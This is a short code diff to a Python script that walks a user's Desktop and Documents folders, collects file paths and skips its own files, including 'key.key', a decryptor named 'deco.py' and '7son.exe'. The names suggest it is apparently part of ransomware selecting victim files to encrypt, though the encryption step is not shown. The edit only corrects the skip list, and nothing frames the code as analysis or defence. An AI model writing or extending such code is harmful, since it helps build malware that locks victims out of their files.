@@ -16,7 +16,7 @@ files = []
 # Search Desktop
 for root, dirs, fils in os.walk(DESK):
     for file in fils:
-        if file in ['7son.pyw', 'key.key', 'deco.py', 'desktop.ini', '7son.pyw', '7son.exe']:
+        if file in ['7son.py', 'key.key', 'deco.py', 'desktop.ini', '7son.pyw', '7son.exe']:
             continue
         filepath = os.path.join(root, file)
         if os.path.isfile(filepath):
@@ -25,7 +25,7 @@ for root, dirs, fils in os.walk(DESK):
 # Search Documents
 for root, dirs, fils in os.walk(DOCS):
     for file in fils:
-        if file in ['7son.pyw', 'key.key', 'deco.py', 'desktop.ini', '7son.pyw', '7son.exe']:
+        if file in ['7son.py', 'key.key', 'deco.py', 'desktop.ini', '7son.pyw', '7son.exe']:
             continue
         filepath = os.path.join(root, file)
         if os.path.isfile(filepath):
